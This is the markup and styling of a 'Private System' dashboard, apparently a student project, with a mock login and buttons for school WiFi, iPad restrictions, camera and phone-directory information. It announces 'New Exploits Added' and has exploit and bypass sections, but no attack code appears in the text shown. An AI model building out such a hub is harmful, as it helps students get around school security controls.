<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    /* Global Styles & Variables */
    :root {
      --dark-bg: #1a1a1a;
      --dark-text: #f9f2dc;
      --dark-box-bg: #2a2a2a;
      --dark-box-border: rgba(255, 145, 77, 0.3);
      --dark-highlight-text: #ffbf80;
      --dark-quick-button: #ff914d;
      --dark-quick-button-hover: #ffb67a;
      --dark-special-button: #ff4c4c;
      --dark-entry-bg: #40210f;
      --dark-entry-text: #ffccb3;
      --dark-calendar-bg: #333;
      --dark-calendar-today-bg: #ff914d;
      --dark-calendar-today-text: black;
      --dark-motivation-bg: #333;
      --dark-motivation-text: #ffd966;
      --notification-info-bg: #3498db;
      --notification-success-bg: #2ecc71;
      --notification-error-bg: #e74c3c;
      --notification-text: white;

      --light-bg: #f9f2dc;
      --light-text: #1a1a1a;
      --light-box-bg: #ffd966;
      --light-box-border: rgba(255, 145, 77, 0.6);
      --light-highlight-text: #994d00;
      --light-quick-button: #ffd966;
      --light-quick-button-hover: #ffeb99;
      --light-special-button: #ff4c4c; /* Panic remains same */
      --light-entry-bg: #ffd999;
      --light-entry-text: #994d00;
      --light-calendar-bg: #ffd966;
      --light-calendar-text: #000;
      --light-calendar-today-bg: #994d00;
      --light-calendar-today-text: #ffd966;
      --light-motivation-bg: #fff3cc;
      --light-motivation-text: #994d00;

      --system-font: 'Montserrat', sans-serif;
      --code-font: 'Share Tech Mono', monospace;

      --primary-accent: #ff914d;
      --secondary-accent: #ffd966;
      --text-color: var(--dark-text);
      --background-color: var(--dark-bg);
      --box-background-color: var(--dark-box-bg);
      --box-shadow-color: var(--dark-box-border);
      --header-bg-color: var(--dark-quick-button);
      --header-text-color: black;
      --button-bg-color: var(--dark-quick-button);
      --button-hover-bg-color: var(--dark-quick-button-hover);
      --panic-button-bg: var(--dark-special-button);
      --panel-heading-color: var(--dark-quick-button);
      --entry-bg-color: var(--dark-entry-bg);
      --entry-text-color: var(--dark-entry-text);
      --calendar-day-bg: var(--dark-calendar-bg);
      --calendar-day-text: var(--dark-text);
      --calendar-today-bg: var(--dark-calendar-today-bg);
      --calendar-today-text: var(--dark-calendar-today-text);
      --motivation-bg: var(--dark-motivation-bg);
      --motivation-text: var(--dark-motivation-text);
    }

    body.light-theme {
      --text-color: var(--light-text);
      --background-color: var(--light-bg);
      --box-background-color: var(--light-box-bg);
      --box-shadow-color: var(--light-box-border);
      --header-bg-color: var(--light-quick-button);
      --header-text-color: var(--light-text);
      --button-bg-color: var(--light-quick-button);
      --button-hover-bg-color: var(--light-quick-button-hover);
      --panic-button-bg: var(--light-special-button);
      --panel-heading-color: var(--light-highlight-text);
      --entry-bg-color: var(--light-entry-bg);
      --entry-text-color: var(--light-entry-text);
      --calendar-day-bg: var(--light-calendar-bg);
      --calendar-day-text: var(--light-calendar-text);
      --calendar-today-bg: var(--light-calendar-today-bg);
      --calendar-today-text: var(--light-calendar-today-text);
      --motivation-bg: var(--light-motivation-bg);
      --motivation-text: var(--light-motivation-text);
    }

    * {
      box-sizing: border-box;
      font-family: var(--system-font);
      transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
    }
    
    body {
      margin: 0; padding: 0;
      color: var(--text-color);
      background: var(--background-color);
    }

    /* Loading Overlay Styles */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: var(--dark-bg);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      font-size: 2em;
      font-family: var(--code-font);
      color: var(--dark-highlight-text);
      z-index: 9999;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.5s ease, visibility 0.5s ease;
    }

    .loading-overlay.visible {
      opacity: 1;
      visibility: visible;
    }

    .loading-box {
      border: 3px solid var(--primary-accent);
      padding: 30px 50px;
      border-radius: 15px;
      box-shadow: 0 0 20px var(--primary-accent);
      animation: pulseBorder 1.5s infinite alternate;
      text-align: center;
    }

    .loading-text {
      margin-top: 20px;
      color: white;
      text-shadow: 0 0 10px white;
    }

    @keyframes pulseBorder {
      0% {
        border-color: var(--primary-accent);
        box-shadow: 0 0 10px var(--primary-accent);
      }
      100% {
        border-color: var(--secondary-accent);
        box-shadow: 0 0 25px var(--secondary-accent);
      }
    }

    /* Login System Styles */
    body.login-body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    
    .login-box {
      background: var(--background-color);
      border-radius: 20px;
      border: 3px solid white;
      box-shadow: 0 0 15px white;
      width: 360px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: var(--code-font);
      color: var(--dark-text); /* Always white for login for contrast */
    }

    body.light-theme .login-box h2 {
        color: var(--light-text); /* For consistency in light theme */
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: #1c1c1c;
      border: none;
      color: white;
      border-radius: 8px;
      font-size: 1em;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .login-box input:focus {
        border-color: var(--primary-accent);
        box-shadow: 0 0 5px var(--primary-accent);
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
      color: var(--text-color);
    }
    
    #showPassword:checked + span {
      color: var(--primary-accent);
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--primary-accent);
      color: black;
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
      font-weight: bold;
    }
    
    .login-box button:hover {
      background-color: var(--button-hover-bg-color);
      transform: translateY(-2px);
    }

    .login-box button:active {
        transform: translateY(0);
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: red;
      font-family: var(--system-font);
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: var(--dark-bg);
      border: 3px solid var(--dark-highlight-text);
      border-radius: 15px;
      box-shadow: 0 0 20px var(--dark-highlight-text);
      z-index: 10;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* Dashboard Styles */
    body.dashboard-body {
      padding: 20px;
      zoom: 1; /* Retain zoom property */
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--header-bg-color);
      padding: 15px 25px;
      border-radius: 12px;
      color: var(--header-text-color);
      margin-bottom: 20px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
      animation: fadeInDown 0.8s ease-out;
    }

    @keyframes fadeInDown {
        from { opacity: 0; transform: translateY(-20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .dashboard-header h1 {
      font-size: 24px;
      margin: 0;
    }

    .user-info {
      font-weight: bold;
    }

    .version-box {
      background: var(--secondary-accent);
      padding: 8px 15px;
      border-radius: 8px;
      color: var(--light-text);
      font-weight: bold;
      animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    @keyframes popIn {
        from { opacity: 0; transform: scale(0.5); }
        to { opacity: 1; transform: scale(1); }
    }

    .quick-bar, .main-features-grid {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 20px; /* Increased margin for better spacing */
      flex-wrap: wrap;
      animation: fadeInUp 0.8s ease-out forwards;
      opacity: 0;
      transform: translateY(20px);
    }

    .quick-bar { animation-delay: 0.2s; }
    .main-features-grid { animation-delay: 0.4s; }

    @keyframes fadeInUp {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }


    .quick-bar button, .main-features-grid button {
      background-color: var(--button-bg-color);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      min-width: 110px;
      white-space: nowrap;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }

    .quick-bar button:hover, .main-features-grid button:hover {
      background-color: var(--button-hover-bg-color);
      transform: translateY(-2px);
    }

    .quick-bar button:active, .main-features-grid button:active {
        transform: translateY(0);
    }

    #panicBtn {
      background: var(--panic-button-bg) !important;
      color: white !important;
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--header-bg-color);
      color: var(--header-text-color);
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
      animation: fadeIn 1s ease-out;
    }

    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }

    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }

    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .box {
      background-color: var(--box-background-color);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px var(--box-shadow-color);
      min-height: 120px;
      flex: 1 1 300px;
      animation: slideInUp 0.6s ease-out;
    }

    @keyframes slideInUp {
        from { opacity: 0; transform: translateY(30px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: var(--panel-heading-color);
    }

    .box p, .box ul {
      font-size: 14px;
    }

    .update-entry, .reminder-entry {
      background: var(--entry-bg-color);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--entry-text-color);
      transition: background-color 0.2s;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
    }

    .reminder-entry.done {
      text-decoration: line-through;
      opacity: 0.7;
      background: gray;
    }

    .reminder-entry button {
      margin-left: 10px;
      padding: 5px 10px;
      background-color: var(--primary-accent);
      color: black;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 0.8em;
    }
    .reminder-entry button:hover {
      background-color: var(--button-hover-bg-color);
    }


    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }

    .calendar div {
      padding: 6px;
      background: var(--calendar-day-bg);
      border-radius: 4px;
      color: var(--calendar-day-text);
    }

    .today {
      background: var(--calendar-today-bg) !important;
      font-weight: bold;
      color: var(--calendar-today-text) !important;
    }

    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      animation: fadeIn 0.8s ease-out;
    }

    #notesCanvas {
      border: 2px solid var(--primary-accent);
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
    }

    #canvasControls {
      margin-top: 10px;
    }

    #canvasControls button {
      background-color: var(--primary-accent);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      margin: 0 5px;
    }

    #canvasControls button:hover {
      background-color: var(--button-hover-bg-color);
    }

    .motivation-box {
      background-color: var(--motivation-bg);
      color: var(--motivation-text);
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px var(--box-shadow-color);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
    }

    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: var(--box-background-color);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: 0 0 15px var(--box-shadow-color);
      animation: fadeIn 0.8s ease-out;
    }

    .info-panel h2 {
      color: var(--panel-heading-color);
      margin-bottom: 15px;
    }

    .wifi-grid, .settings-section-grid, .school-info-grid, .reminders-list-container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 10px;
      margin-bottom: 15px;
    }
    
    .reminders-list-container {
      grid-template-columns: 1fr; /* Reminders stack */
    }


    .wifi-grid div, .settings-section-grid div, .school-info-grid div, .reminder-input-group label {
      padding: 8px;
      background: var(--entry-bg-color);
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      color: var(--entry-text-color);
    }

    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }

    .wifi-entry div {
      padding: 8px;
      background: var(--entry-bg-color);
      border-radius: 6px;
      text-align: center;
      color: var(--entry-text-color);
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons, .ipad-options {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    .handbook-buttons button, .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button, .ipad-options button {
      background-color: var(--button-bg-color);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      text-decoration: none;
      text-align: center;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }

    .handbook-buttons button:hover, .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover, .ipad-options button:hover {
      background-color: var(--button-hover-bg-color);
      transform: translateY(-2px);
    }
    .handbook-buttons button:active, .handbook-buttons a:active, .links-list a:active, .exploit-buttons a:active, .bypass-buttons button:active, .ipad-options button:active {
        transform: translateY(0);
    }

    .coming-soon, .info-text {
      background: var(--entry-bg-color);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      color: var(--entry-text-color);
    }

    .school-info-item {
      background: var(--entry-bg-color);
      padding: 12px;
      border-radius: 8px;
      color: var(--entry-text-color);
    }

    .school-info-label {
      font-weight: bold;
      color: var(--panel-heading-color);
      margin-bottom: 5px;
    }

    .ipad-content, .bypass-content {
      display: none;
      background: var(--entry-bg-color);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      color: var(--entry-text-color);
    }
    
    /* Settings Panel Specific Styles */
    .settings-panel-category {
      background-color: var(--entry-bg-color);
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 15px;
      color: var(--entry-text-color);
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }

    .settings-panel-category h3 {
      margin-top: 0;
      color: var(--panel-heading-color);
      font-size: 1.2em;
      margin-bottom: 10px;
    }

    .setting-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 8px 0;
      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    }

    .setting-item:last-child {
      border-bottom: none;
    }

    .setting-item label {
      flex-grow: 1;
      margin-right: 15px;
      font-size: 0.95em;
    }

    .setting-item input[type="checkbox"], .setting-item input[type="range"], .setting-item select, .setting-item input[type="color"] {
      -webkit-appearance: none;
      appearance: none;
      height: 20px;
      border-radius: 5px;
      background: #ccc;
      outline: none;
      opacity: 0.7;
      transition: opacity .2s;
    }
    .setting-item input[type="checkbox"]:hover, .setting-item input[type="range"]:hover, .setting-item select:hover, .setting-item input[type="color"]:hover {
        opacity: 1;
    }
    .setting-item input[type="checkbox"]:checked {
        background-color: var(--primary-accent);
    }

    .setting-item input[type="checkbox"] {
        width: 35px;
        height: 20px;
        border-radius: 10px;
        background-color: #bebebe;
        position: relative;
        cursor: pointer;
        display: inline-block;
        transition: background-color 0.2s;
    }

    .setting-item input[type="checkbox"]::after {
        content: '';
        position: absolute;
        top: 2px;
        left: 2px;
        width: 16px;
        height: 16px;
        border-radius: 50%;
        background-color: white;
        transition: left 0.2s;
    }

    .setting-item input[type="checkbox"]:checked {
        background-color: var(--primary-accent);
    }

    .setting-item input[type="checkbox"]:checked::after {
        left: 17px;
    }


    .setting-item input[type="range"] {
      width: 120px;
      height: 8px;
      cursor: pointer;
    }
    .setting-item input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 16px;
      height: 16px;
      border-radius: 50%;
      background: var(--primary-accent);
      cursor: grab;
      box-shadow: 0 0 2px rgba(0,0,0,0.5);
    }

    .setting-item select {
      padding: 5px 10px;
      background-color: var(--dark-box-bg);
      border: 1px solid var(--primary-accent);
      color: var(--dark-text);
      border-radius: 5px;
      cursor: pointer;
    }
    body.light-theme .setting-item select {
        background-color: var(--light-box-bg);
        border-color: var(--panel-heading-color);
        color: var(--light-text);
    }
    
    .setting-item input[type="color"] {
        width: 30px;
        height: 30px;
        border: none;
        padding: 0;
        cursor: pointer;
        border-radius: 5px;
        overflow: hidden; /* Hide default border */
    }
    .setting-item input[type="color"]::-webkit-color-swatch-wrapper {
        padding: 0;
    }
    .setting-item input[type="color"]::-webkit-color-swatch {
        border: none;
        border-radius: 5px; /* Ensure color itself is rounded */
    }


    .settings-actions button {
      margin-top: 20px;
      padding: 10px 20px;
      background-color: var(--primary-accent);
      color: black;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      transition: background 0.2s, transform 0.1s;
      margin-right: 10px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }

    .settings-actions button:hover {
      background-color: var(--button-hover-bg-color);
      transform: translateY(-2px);
    }
    .settings-actions button:active {
        transform: translateY(0);
    }

    .code-display {
      background: #1c1c1c;
      padding: 10px;
      border-radius: 5px;
      font-family: var(--code-font);
      font-size: 0.8em;
      white-space: pre-wrap;
      max-height: 200px;
      overflow-y: auto;
      margin-top: 10px;
    }

    .reminder-input-group {
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-bottom: 20px;
    }

    .reminder-input-group input[type="text"],
    .reminder-input-group input[type="date"],
    .reminder-input-group input[type="time"] {
        padding: 10px;
        border: 1px solid var(--primary-accent);
        background: var(--dark-box-bg);
        color: var(--dark-text);
        border-radius: 5px;
        outline: none;
    }
    body.light-theme .reminder-input-group input {
        background: var(--light-box-bg);
        color: var(--light-text);
        border-color: var(--panel-heading-color);
    }

    .reminder-input-group button {
        background-color: var(--primary-accent);
        color: black;
        padding: 10px 15px;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        transition: background 0.2s;
    }
    .reminder-input-group button:hover {
        background-color: var(--button-hover-bg-color);
    }
    .reminder-controls button {
      margin-right: 10px;
      background-color: var(--primary-accent);
      color: black;
      padding: 8px 12px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    .reminder-controls button:hover {
      background-color: var(--button-hover-bg-color);
    }

    /* Notification Toast System */
    #notification-container {
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 10000;
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .notification-toast {
        background-color: #333;
        color: white;
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
        opacity: 0;
        transform: translateX(100%);
        animation: slideInLeft 0.5s forwards, fadeOut 0.5s 2.5s forwards;
        min-width: 250px;
        max-width: 350px;
        transition: background-color 0.2s;
    }

    .notification-toast.info { background-color: var(--notification-info-bg); }
    .notification-toast.success { background-color: var(--notification-success-bg); }
    .notification-toast.error { background-color: var(--notification-error-bg); }

    .notification-toast.show {
      opacity: 1;
      transform: translateX(0);
      animation: slideInRight 0.5s forwards; /* Use slideInRight for coming from right */
    }

    .notification-toast.hide {
      opacity: 0;
      transform: translateX(100%);
      animation: slideOutRight 0.5s forwards;
    }

    @keyframes slideInRight {
        from { opacity: 0; transform: translateX(100%); }
        to { opacity: 1; transform: translateX(0); }
    }

    @keyframes slideOutRight {
        from { opacity: 1; transform: translateX(0%); }
        to { opacity: 0; transform: translateX(100%); }
    }


    /* Placeholder for content panels in dashboard - each of these will have their own styling and content, following a similar pattern to other info-panels */
    #userProfilePanel, #messageCenterPanel, #fileManagerPanel, #taskTrackerPanel, #studentResourcesPanel,
    #facultyStaffPanel, #calendarEventsPanel, #announcementsBoardPanel, #gradeBookPanel, #attendanceRecordsPanel,
    #busSchedulesPanel, #cafeteriaMenuPanel, #libraryPortalPanel, #clubsActivitiesPanel, #athleticsInfoPanel,
    #schoolNewsFeedPanel, #helpSupportPanel, #systemStatusPanel, #developerConsolePanel, #accessibilityOptionsPanel,
    #feedbackSuggestionsPanel, #emergencyProtocolPanel, #settingsPanel, #reminderSystemPanel {
        /* Generic info panel styling already applies, custom content for each would go here. */
        display: none; /* Initially hidden */
    }

    #studentResourcesPanel .links-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }

    #studentResourcesPanel .links-grid a {
        background-color: var(--button-bg-color);
        border: none;
        padding: 12px;
        border-radius: 8px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s, transform 0.1s;
        text-decoration: none;
        text-align: center;
        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
    }
    #studentResourcesPanel .links-grid a:hover {
        background-color: var(--button-hover-bg-color);
        transform: translateY(-2px);
    }
  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body id="bodyElement">

    <!-- Loading Screens -->
    <div id="loadingOverlay1" class="loading-overlay">
        <div class="loading-box">
            <span style="color: var(--primary-accent); font-size: 1.5em;">&lt;/&gt;</span>
            <div class="loading-text">INITIALIZING SYSTEM..</div>
        </div>
    </div>
    <div id="loadingOverlay2" class="loading-overlay">
        <div class="loading-box">
            <span style="color: var(--secondary-accent); font-size: 1.5em;">&#x26BF;</span>
            <div class="loading-text">LOADING KEY SYSTEM..</div>
        </div>
    </div>
    <div id="loadingOverlayDashboard" class="loading-overlay">
        <div class="loading-box">
            <span style="color: white; font-size: 1.5em;">&#x25CB;</span>
            <div class="loading-text">LOADING DASHBOARD..</div>
        </div>
    </div>


  <!-- Login System -->
  <div class="login-box" id="loginBox" style="display: none;">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <button id="notesBtn">📒 Notes</button>
      <button id="exportNotesBtn">💾 Export Notes</button>
      <button id="screenshotBtn">📸 Screenshot</button>
      <button id="toggleSectionsBtn">⬆️ Toggle Sections</button>
      <button id="fixIssuesBtn">🛠️ Fix Issues</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="zoomInBtn">➕ Zoom In</button>
      <button id="zoomOutBtn">➖ Zoom Out</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="panicBtn">🚨 Panic</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>

    <!-- NEW: Main Features Grid for More Buttons -->
    <div class="main-features-grid" id="mainFeaturesGrid">
        <button id="settingsBtn" onclick="dashboard.togglePanel('settingsPanel')">⚙️ Settings</button>
        <button id="reminderSystemBtn" onclick="dashboard.togglePanel('reminderSystemPanel')">🔔 Reminder System</button>
        <button id="userProfileBtn" onclick="dashboard.togglePanel('userProfilePanel')">👤 User Profile</button>
        <button id="messageCenterBtn" onclick="dashboard.togglePanel('messageCenterPanel')">✉️ Message Center</button>
        <button id="fileManagerBtn" onclick="dashboard.togglePanel('fileManagerPanel')">🗄️ File Manager</button>
        <button id="taskTrackerBtn" onclick="dashboard.togglePanel('taskTrackerPanel')">✅ Task Tracker</button>
        <button id="studentResourcesBtn" onclick="dashboard.togglePanel('studentResourcesPanel')">📚 Student Resources</button>
        <button id="facultyStaffBtn" onclick="dashboard.togglePanel('facultyStaffPanel')">🧑‍🏫 Faculty & Staff</button>
        <button id="calendarEventsBtn" onclick="dashboard.togglePanel('calendarEventsPanel')">🗓️ Calendar Events</button>
        <button id="announcementsBoardBtn" onclick="dashboard.togglePanel('announcementsBoardPanel')">📣 Announcements Board</button>
        <button id="gradeBookBtn" onclick="dashboard.togglePanel('gradeBookPanel')">📈 Grade Book</button>
        <button id="attendanceRecordsBtn" onclick="dashboard.togglePanel('attendanceRecordsPanel')">✔️ Attendance Records</button>
        <button id="busSchedulesBtn" onclick="dashboard.togglePanel('busSchedulesPanel')">🚌 Bus Schedules</button>
        <button id="cafeteriaMenuBtn" onclick="dashboard.togglePanel('cafeteriaMenuPanel')">🍽️ Cafeteria Menu</button>
        <button id="libraryPortalBtn" onclick="dashboard.togglePanel('libraryPortalPanel')">🏛️ Library Portal</button>
        <button id="clubsActivitiesBtn" onclick="dashboard.togglePanel('clubsActivitiesPanel')">🏅 Clubs & Activities</button>
        <button id="athleticsInfoBtn" onclick="dashboard.togglePanel('athleticsInfoPanel')">🏈 Athletics Info</button>
        <button id="schoolNewsFeedBtn" onclick="dashboard.togglePanel('schoolNewsFeedPanel')">📰 School News Feed</button>
        <button id="helpSupportBtn" onclick="dashboard.togglePanel('helpSupportPanel')">❓ Help & Support</button>
        <button id="systemStatusBtn" onclick="dashboard.togglePanel('systemStatusPanel')">📊 System Status</button>
        <button id="developerConsoleBtn" onclick="dashboard.togglePanel('developerConsolePanel')">🧑‍💻 Developer Console</button>
        <button id="accessibilityOptionsBtn" onclick="dashboard.togglePanel('accessibilityOptionsPanel')">♿ Accessibility Options</button>
        <button id="feedbackSuggestionsBtn" onclick="dashboard.togglePanel('feedbackSuggestionsPanel')">💡 Feedback & Suggestions</button>
        <a href="https://example.com/privacy-policy" target="_blank" class="dashboard-button" onclick="dashboard.showNotification('Navigating to Privacy Policy', 'info')">🔒 Privacy Policy</a>
        <a href="https://example.com/terms-of-service" target="_blank" class="dashboard-button" onclick="dashboard.showNotification('Navigating to Terms of Service', 'info')">📜 Terms of Service</a>
        <button id="emergencyProtocolBtn" onclick="dashboard.togglePanel('emergencyProtocolPanel')">🚨 Emergency Protocol</button>
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;">
        <h2>🔔 Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
      </div>
    </div>

    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px;">
      <button onclick="dashboard.togglePanel('wifiPanel'); dashboard.showNotification('You clicked: School WiFi Information', 'info')">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel'); dashboard.showNotification('You clicked: School iPad Restrictions', 'info')">📱 School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel'); dashboard.showNotification('You clicked: Student Handbooks Information', 'info')">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel'); dashboard.showNotification('You clicked: School Building Map Information', 'info')">🏫 School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel'); dashboard.showNotification('You clicked: Student Website\'s Information', 'info')">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel'); dashboard.showNotification('You clicked: Teacher Websites Information', 'info')">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel'); dashboard.showNotification('You clicked: School Phone Directory Information', 'info')">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel'); dashboard.showNotification('You clicked: School Camera Information', 'info')">📷 School Camera Information</button>
